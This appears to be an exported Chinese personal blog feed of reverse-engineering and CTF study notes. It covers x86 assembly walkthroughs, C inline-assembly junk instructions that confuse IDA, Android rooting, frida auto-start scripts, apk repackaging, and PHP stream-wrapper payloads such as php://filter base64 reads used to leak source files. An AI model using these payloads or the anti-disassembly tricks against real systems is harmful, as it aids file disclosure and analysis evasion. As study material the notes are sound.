<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401056 loc_401056:                             ; CODE XREF: sub_401032+1A↑j</span><br><span class="line">.text:00401056 pop     edi</span><br><span class="line">.text:00401057 pop     esi</span><br><span class="line">.text:00401058 pop     edx</span><br><span class="line">.text:00401059 pop     eax</span><br><span class="line">.text:0040105A leave</span><br><span class="line">.text:0040105B retn    8</span><br><span class="line">.text:0040105B sub_401032 endp</span><br></pre></td></tr></table></figure></div>

<p>这几个pop都类似</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225162850053.png"
                      alt="image-20221225162850053"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225162901007.png"
                      alt="image-20221225162901007"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225162907372.png"
                      alt="image-20221225162907372"
                ></p>
<p>变为了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225162926939.png"
                      alt="image-20221225162926939"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225162934661.png"
                      alt="image-20221225162934661"  
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225162950621.png"
                      alt="image-20221225162950621"
                ></p>
<p>leave</p>
<p>观察得出EBP,ESP和栈顶发生了变化</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225163417850.png"
                      alt="image-20221225163417850"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225163434471.png"
                      alt="image-20221225163434471"
                ></p>
<p>执行指令后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225163501075.png"
                      alt="image-20221225163501075"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225163511164.png"
                      alt="image-20221225163511164"
                ></p>
<p>所以leave相当于</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure></div>

<p>retn    8</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225164933264.png"
                      alt="image-20221225164933264"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225164949756.png"
                      alt="image-20221225164949756"
                ></p>
<p>执行后eip变为了原栈顶所指向的函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225165012100.png"
                      alt="image-20221225165012100"
                ></p>
<p>ESP也增加了8+4</p>
<p>所以retn 8&#x3D;</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop eip</span><br><span class="line">add esp, 8</span><br></pre></td></tr></table></figure></div>

<p>retn后eip指向的位置是</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:0040102B push    0                               ; uExitCode</span><br><span class="line">.text:0040102D call    ExitProcess</span><br></pre></td></tr></table></figure></div>

<p>push 0相当于传参数给了要call的ExitProcess函数</p>
<p>此处ExitProcess是退出的函数相当于直接退出程序</p>
<h2 id="strcpy-exe"><a href="#strcpy-exe" class="headerlink" title="strcpy.exe"></a>strcpy.exe</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401032 sub_401032 proc near                    ; CODE XREF: .text:0040100A↑j</span><br><span class="line">.text:00401032                                         ; sub_40101C+A↑p</span><br><span class="line">.text:00401032</span><br><span class="line">.text:00401032 arg_0= dword ptr  8</span><br><span class="line">.text:00401032 arg_4= dword ptr  0Ch</span><br><span class="line">.text:00401032</span><br><span class="line">.text:00401032 push    ebp</span><br><span class="line">.text:00401033 mov     ebp, esp</span><br><span class="line">.text:00401035 push    eax</span><br><span class="line">.text:00401036 push    ecx</span><br><span class="line">.text:00401037 push    esi</span><br><span class="line">.text:00401038 push    edi</span><br><span class="line">.text:00401039 mov     ecx, 4</span><br><span class="line">.text:0040103E mov     esi, [ebp+arg_0]</span><br><span class="line">.text:00401041 mov     edi, [ebp+arg_4]</span><br><span class="line">.text:00401044 cld</span><br><span class="line">.text:00401045 rep movsb</span><br><span class="line">.text:00401047 pop     edi</span><br><span class="line">.text:00401048 pop     esi</span><br><span class="line">.text:00401049 pop     ecx</span><br><span class="line">.text:0040104A pop     eax</span><br><span class="line">.text:0040104B leave</span><br><span class="line">.text:0040104C retn    8</span><br><span class="line">.text:0040104C sub_401032 endp</span><br></pre></td></tr></table></figure></div>

<p>cld指令</p>
<p>通过搜索发现，其会更改DF为0值</p>
<p>因为原本DF就为0，所以我在运行时并未发现变化，此指令应该是用来访问字符串的</p>
<p>注：DF决定了内存访问的方向（DF&#x3D;0，向高地址增加）（DF&#x3D;1，向地地址减小）</p>
<p>rep movsb</p>
<p>其更改了ecx,esi和edi的值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225171012597.png"
                      alt="image-20221225171012597"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225171026472.png"
                      alt="image-20221225171026472"
                ></p>
<p>ECX 4-&gt;0</p>
<p>通过搜索发现</p>
<p>movsb是移动一字节从ESI往EDI（不更改原数据，同时使ESI+1 EDI+1）</p>
<p>rep movsb</p>
<p>rep就是重复的意思上面的指令就是重复移动，通过对ECX赋值来确定移动的次数</p>
<h2 id="strlen-exe"><a href="#strlen-exe" class="headerlink" title="strlen.exe"></a>strlen.exe</h2><p>字符串长度的主要代码部分</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225175311965.png"
                      alt="image-20221225175311965"
                ></p>
<p>将字符串每个字符与\0比较，不为0就让edi，eax（用于存储长度）自增1，直到为0时就停止</p>
<h2 id="递归求和-exe"><a href="#递归求和-exe" class="headerlink" title="递归求和.exe"></a>递归求和.exe</h2><p>dec ecx</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225173710614.png"
                      alt="image-20221225173710614"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225173721298.png"
                      alt="image-20221225173721298"
                ></p>
<p>使ecx自减了1</p>
<p>递归求和的主要代码部分：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\wrwrw\AppData\Roaming\Typora\typora-user-images\image-20221225175016173.png"
                      alt="image-20221225175016173"
                ></p>
<p>相当于从ECX的值一直加到0，从大到小，用EAX作为累加器，直到ECX&#x3D;0时停止</p>
<h2 id="字符串大写-exe"><a href="#字符串大写-exe" class="headerlink" title="字符串大写.exe"></a>字符串大写.exe</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">loc_401035:                             ; CODE XREF: sub_40102D+1A↓j</span><br><span class="line">.text:00401035                 mov     al, [esi]</span><br><span class="line">.text:00401037                 cmp     al, 0</span><br><span class="line">.text:00401039                 jz      short loc_401049</span><br><span class="line">.text:0040103B                 cmp     al, 61h ; &#x27;a&#x27;</span><br><span class="line">.text:0040103D                 jb      short loc_401046</span><br><span class="line">.text:0040103F                 cmp     al, 7Ah ; &#x27;z&#x27;</span><br><span class="line">.text:00401041                 ja      short loc_401046</span><br><span class="line">.text:00401043                 and     byte ptr [esi], 0DFh</span><br></pre></td></tr></table></figure></div>

<p>jz相等就跳转，jb小于就跳转，ja大于就跳转</p>
<p>等于0就代表字符串结束就不用更改大小写直接可以进入程序的结尾</p>
<p>而符合a~z则就需要更改大小写</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>花指令</title>
    <url>/2023/03/19/Re/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8A%A5%E5%91%8A/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="g-内联-x64"><a href="#g-内联-x64" class="headerlink" title="g++内联(x64)"></a>g++内联(x64)</h1><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add1</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x =<span class="number">0</span>,y=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;.globl _start\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;_start:&quot;</span></span><br><span class="line">        <span class="string">&quot;call _sec\n\t&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;.globl _sec\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;_sec:&quot;</span></span><br><span class="line">        <span class="string">&quot;call _thr\n\t&quot;</span><span class="comment">//下方都是无意义的代码</span></span><br><span class="line">        <span class="string">&quot;call 0xef\n\t&quot;</span><span class="comment">//只增加一个call时ida无变化</span></span><br><span class="line">        <span class="string">&quot;mov 4,%%rax\n\t&quot;</span><span class="comment">//增加对rax修改时ida无变化</span></span><br><span class="line">        <span class="string">&quot;add $4,%1\n\t&quot;</span><span class="comment">//增加对参数修改时ida无变化</span></span><br><span class="line">        <span class="string">&quot;push %%rsp\n\t&quot;</span><span class="comment">//多个push只提示堆栈不平衡ida无变化</span></span><br><span class="line">        <span class="string">&quot;push %%rsp\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;push %%rsp\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;push %%rsp\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;ret&quot;</span><span class="comment">//增加无意义的ret ida无法识别</span></span><br><span class="line">        :<span class="string">&quot;+r&quot;</span>(x)</span><br><span class="line">    );    </span><br><span class="line">    <span class="keyword">asm</span>(  <span class="string">&quot;.globl _sec\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;_thr:&quot;</span></span><br><span class="line">        <span class="string">&quot;add $16,%esp\n\t&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,add1(x,y));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="cl内联-x86"><a href="#cl内联-x86" class="headerlink" title="cl内联(x86)"></a>cl内联(x86)</h1><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add1</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        call c1;</span><br><span class="line">        push eax;</span><br><span class="line">        push ebx;</span><br><span class="line">    c1:</span><br><span class="line">        call c2;</span><br><span class="line">        push eax;</span><br><span class="line">        pop eax;</span><br><span class="line">    c2:</span><br><span class="line">        add esp,<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, add1(a, b));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>只进行无意义的push操作时ida直接无法识别</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>实验室报告</category>
      </categories>
  </entry>
  <entry>
    <title>AndroidStudioemulator_Root</title>
    <url>/2024/05/29/Re/%E5%AE%89%E5%8D%93/AndroidStudioemulator_Root/</url>
    <content><![CDATA[<p>[<a class="link"   href="https://xdaforums.com/t/script-rootavd-root-your-android-studio-virtual-device-emulator-with-magisk-android-linux-darwin-macos-win-google-play-store-apis.4218123/" >SCRIPT] rootAVD - root your Android Studio Virtual Device emulator with Magisk [Android][Linux][Darwin&#x2F;MacOS][WIN][Google Play Store APIs] | XDA Forums <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>IDA导入JNI</title>
    <url>/2023/06/24/Re/%E5%AE%89%E5%8D%93/IDA%E5%AF%BC%E5%85%A5JNI/</url>
    <content><![CDATA[<p>在so文件逆向中总是遇到这种的调用，因为对a1的定义不明所以会直接用地址调用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307122119524.png"
                      alt="image-20230712211924489"
                ></p>
<p>高版本的ida可以直接手动将a1定义为JNIEnv*，ida会自动寻找对应的定义</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307122120738.png"
                      alt="image-20230712212039713"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202307122120464.png"
                      alt="image-20230712212055442"
                ></p>
<p>这样就能正常的查看代码了</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>JNIso文件混淆</title>
    <url>/2023/07/10/Re/%E5%AE%89%E5%8D%93/JNIso%E6%96%87%E4%BB%B6%E6%B7%B7%E6%B7%86/</url>
    <content><![CDATA[<p>主要需要查看so文件的JNI_OnLoad函数，查看是如何进行注册的，对应的函数名是什么</p>
<p>类似于下图，就是将sub_1434注册为java内的com&#x2F;ctf&#x2F;findthekey&#x2F;MainActivity findthekey方法</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">jint <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="type">void</span> *reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+24h] [bp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">3</span>]; <span class="comment">// [sp+28h] [bp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  sub_15A0(vm, &amp;v4, <span class="number">65542</span>);</span><br><span class="line">  v5[<span class="number">2</span>] = (<span class="type">int</span>)sub_1434;</span><br><span class="line">  v5[<span class="number">1</span>] = (<span class="type">int</span>)byte_5120;                       <span class="comment">// (Ljava/lang/Object;)</span></span><br><span class="line">  v5[<span class="number">0</span>] = (<span class="type">int</span>)byte_510C;                       <span class="comment">// findthekey</span></span><br><span class="line">  v2 = sub_15D4(v4, byte_5140);                 <span class="comment">// &#x27;com/ctf/findthekey/MainActivity&#x27;</span></span><br><span class="line">  sub_15FE(v4, v2, v5, <span class="number">1</span>); <span class="comment">//此处应该是将com/ctf/findthekey/MainActivity的findthekey方法注册为sub_1434方法</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">65542</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>WSA</title>
    <url>/2023/10/17/Re/%E5%AE%89%E5%8D%93/WSA/</url>
    <content><![CDATA[<p><a class="link"   href="https://a-jiua.github.io/blog/2023/07/22/WSAOnWin10_-_%E5%9C%A8_Windows10_%E4%B8%8A%E4%BD%BF%E7%94%A8WSA/" >WSAOnWin10 - 在 Windows10 上使用WSA | 行雺のBlog | Hexo (a-jiua.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>具体环境配置，因为wsa api版本过新所以magisk的大部分包都用不了，但magisk自带一个busybox，路径为<code>/data/adb/magisk</code>将其加入代码搜索路径内<code>export PATH=$PATH:/data/adb/magisk</code></p>
<p>同时因为wsa的<code>ro.debuggable</code>参数被设置为了0所以有些代码调试的时候会跑飞用<code>magisk resetprop ro.debuggable 1</code>命令修改掉默认值(每次重启都会失效)</p>
<p>设置以arm模式安装apk</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb install --abi arm64-v8a pkgname</span><br><span class="line">adb install --abi armeabi-v7a pkgname</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>aab2apk</title>
    <url>/2024/05/01/Re/%E5%AE%89%E5%8D%93/aab2apk/</url>
    <content><![CDATA[<p><a class="link"   href="https://jedok.com/converter/aab-to-apk" >https://jedok.com/converter/aab-to-apk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>有在线转换器</p>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>androidkiller_runtime_error</title>
    <url>/2024/07/24/Re/%E5%AE%89%E5%8D%93/androidkiller_runtime_error/</url>
    <content><![CDATA[<p>更改androidkiller下的configs.ini</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202407241559849.png"
                      alt="image-20240724155954742"
                ></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>ab(android backup)文件提取</title>
    <url>/2023/08/09/Re/%E5%AE%89%E5%8D%93/ab(android%20backup)%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96/</url>
    <content><![CDATA[<p>需要下载abe.jar工具<a class="link"   href="https://github.com/nelenkov/android-backup-extractor" >https://github.com/nelenkov/android-backup-extractor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>具体命令</p>
<blockquote>
<p>abe.jar unpack “ab文件地址” “输出文件地址”</p>
</blockquote>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>android动态调试</title>
    <url>/2023/08/07/Re/%E5%AE%89%E5%8D%93/android%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<p>调试主要是为了看出函数的作用，所以可以有两种方法</p>
<h2 id="一、使用debugger调试（需要系统与apk包两者同时支持）"><a href="#一、使用debugger调试（需要系统与apk包两者同时支持）" class="headerlink" title="一、使用debugger调试（需要系统与apk包两者同时支持）"></a>一、使用debugger调试（需要系统与apk包两者同时支持）</h2><h2 id="二、hook调用"><a href="#二、hook调用" class="headerlink" title="二、hook调用"></a>二、hook调用</h2><p>hook相当于可以动态调用jvm内的所有属性，包括变量，函数，有两类工具（都是基于frida框架）<a class="link"   href="https://runwu2204.github.io/2024/01/21/Re/%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/frida%E6%A1%86%E6%9E%B6/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" >frida环境配置 - Runwu2204 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>apk重打包</title>
    <url>/2024/07/14/Re/%E5%AE%89%E5%8D%93/apk%E9%87%8D%E6%89%93%E5%8C%85/</url>
    <content><![CDATA[<p><code>apktool d input.apk</code>解包input.apk 不能直接解压会出现确实某参数的问题</p>
<p><code>apktool b .\com.zrubfinance -o 1.apk</code></p>
<blockquote>
<p>注意 重封包的apk未进行内存对齐需通过</p>
<p><code>zipalign -p -f -v 4 input.apk out.apk</code></p>
<p>然后签名</p>
<p><code>apksigner sign -ks E:\keystore\test1.jks -out out.apk input.apk</code></p>
<p>就可以了</p>
</blockquote>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>misc</title>
    <url>/2024/06/03/Re/%E5%AE%89%E5%8D%93/misc/</url>
    <content><![CDATA[<h2 id="应用操作"><a href="#应用操作" class="headerlink" title="应用操作"></a>应用操作</h2><h3 id="手动发送广播"><a href="#手动发送广播" class="headerlink" title="手动发送广播"></a>手动发送广播</h3><blockquote>
<p><a class="link"   href="https://www.cnblogs.com/tc310/p/11152853.html" >Android通过adb shell am broadcast发送广播 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h3 id="启动actvity"><a href="#启动actvity" class="headerlink" title="启动actvity"></a>启动actvity</h3><blockquote>
<p><a class="link"   href="https://www.cnblogs.com/yhjoker/p/8974119.html" >Android Studio 动态调试 apk 反编译出的 smali 代码 - yhjoker - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code> adb shell am start -D -S -W packageName/ActivityName</code>    &#x2F;&#x2F;以调试状态运行目标activity </p>
</blockquote>
<h2 id="自启动任务"><a href="#自启动任务" class="headerlink" title="自启动任务"></a>自启动任务</h2><p>向<code>/data/adb/post-fs-data.d</code>写入自定义<code>.sh</code>文件即可</p>
<p>注意给xxx权限(<code>chmod +xxx</code>)</p>
<p>比如</p>
<blockquote>
<p>1、<code>su -c /data/local/tmp/frida-server-16.3.1-android-arm</code>写入frida.sh(名字任意)</p>
<p>2、<code>chmod +xxx frida.sh</code></p>
<p>重启后用frida hook任意应用,能hook即可</p>
</blockquote>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>脱壳</title>
    <url>/2024/07/13/Re/%E5%AE%89%E5%8D%93/%E8%84%B1%E5%A3%B3/</url>
    <content><![CDATA[<p><a class="link"   href="https://blog.csdn.net/shulianghan/article/details/121895054" >【Android 逆向】脱壳解决方案 ( DEX 整体加壳 | 函数抽取加壳 | VMP 加壳 | Dex2C 加壳 | Android 应用加固防护级别 )-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>[<a class="link"   href="https://bbs.kanxue.com/thread-281745.htm#msg_header_h1_10" >原创]关于最近脱壳的笔记 还请各位大佬指教-Android安全-看雪-安全社区|安全招聘|kanxue.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>普通的壳类似于SMC</p>
<h2 id="爱加密"><a href="#爱加密" class="headerlink" title="爱加密"></a>爱加密</h2><p>参考<a class="link"   href="https://blog.csdn.net/xiziyunqi/article/details/77514751" >脱掉“爱加密”家的壳_爱加密企业版脱壳-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>以application为基准</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/ZrubAppTheme&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@drawable/icon_logo&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;p000s.p001h.p002e.p003l.p004l.ApplicationC0014S&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:excludeFromRecents</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:testOnly</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hardwareAccelerated</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:largeHeap</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:extractNativeLibs</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:resizeableActivity</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:networkSecurityConfig</span>=<span class="string">&quot;@xml/network_security_config&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;s.h.e.l.l.A&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:requestLegacyExternalStorage</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowNativeHeapPointerTagging</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>此处添加了<code>android:name</code>项</p>
<p>参考<a class="link"   href="https://blog.csdn.net/qq_41767945/article/details/99697407" >AndroidManifest.xml中application name功能介绍_android application name-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>用于启用自己私有的<code>Application</code>类用来进行壳相关操作</p>
<p>Application有三类方法<code>attachBaseContext</code> <code>onCreate</code> </p>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>自动任务</title>
    <url>/2024/06/02/Re/%E5%AE%89%E5%8D%93/%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<p>向<code>/data/adb/post-fs-data.d</code>写入自定义<code>.sh</code>文件即可</p>
<p>注意给xxx权限(<code>chmod +xxx</code>)</p>
<p>比如</p>
<blockquote>
<p>1、<code>su -c /data/local/tmp/frida-server-16.3.1-android-arm</code>写入frida.sh(名字任意)</p>
<p>2、<code>chmod +xxx frida.sh</code></p>
<p>重启后用frida hook任意应用,能hook即可</p>
</blockquote>
<p>还有</p>
<blockquote>
<p><code>su -c magisk resetprop ro.debuggable 1&quot;&gt;&gt;debug.sh &amp;&amp; su -c chmod +xxx ./debug.sh</code>每次启动时自动设置<code>ro.debuggable</code></p>
</blockquote>
]]></content>
      <categories>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>api</title>
    <url>/2024/06/07/Web/Python/api/</url>
    <content><![CDATA[<p>os.path.join</p>
<p>以最后出现&#x2F;的字符串为基地址</p>
]]></content>
      <categories>
        <category>Web</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>PHP伪协议</title>
    <url>/2023/04/13/Web/php/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h1><p>参数名加上伪协议如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=data://text/plain,wrwrwr</span><br></pre></td></tr></table></figure></div>

<h2 id="读取数据-一般用于读取源码"><a href="#读取数据-一般用于读取源码" class="headerlink" title="读取数据(一般用于读取源码)"></a>读取数据(一般用于读取源码)</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/resource=你要读取的文件名（带后缀）</span><br><span class="line"></span><br><span class="line">php://filter/convert.base64-encode/resource=你要读取的文件名（带后缀）</span><br></pre></td></tr></table></figure></div>



<h2 id="将数据当作文件来对待"><a href="#将数据当作文件来对待" class="headerlink" title="将数据当作文件来对待"></a>将数据当作文件来对待</h2><p>用于file_get_content()等函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">data://text/plain,数据(可以是字符串)</span><br><span class="line"></span><br><span class="line">data://text/plain;base64,数据(base64格式的)</span><br></pre></td></tr></table></figure></div>

]]></content>
